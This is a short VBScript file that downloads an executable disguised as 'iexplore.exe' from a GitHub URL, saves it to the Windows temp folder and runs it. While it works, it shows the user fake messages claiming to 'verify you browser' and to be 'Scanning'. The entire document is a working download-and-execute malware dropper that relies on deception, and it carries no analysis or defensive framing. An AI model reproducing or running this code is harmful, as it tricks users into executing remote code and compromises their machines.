strLink = "https://raw.githubusercontent.com/megansoft/ace/master/iexplore.exe"
' Get file name from URL.

strSaveName = Mid(strLink, InStrRev(strLink,"/") + 1, Len(strLink))
strSaveTo = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")& "\" & strSaveName

WScript.Echo "Wait for few second we will verify you browser"

' Create an HTTP object
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

' Download the specified URL
'xmlhttp.Open "GET", strURL, false, "User", "Password"
objHTTP.open "GET", strLink, False
objHTTP.send
 
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists(strSaveTo) Then
  objFSO.DeleteFile(strSaveTo)
End If

If objHTTP.Status = 200 Then
  Dim objStream
  Set objStream = CreateObject("ADODB.Stream")
  With objStream
    .Type = 1 'adTypeBinary
    .Open
    .Write objHTTP.responseBody
    .SaveToFile strSaveTo
    .Close
  End With
  set objStream = Nothing
End If

If objFSO.FileExists(strSaveTo) Then
  WScript.Echo "We are Scanning Just Wait"
End If

CreateObject("WScript.Shell").Run strSaveTo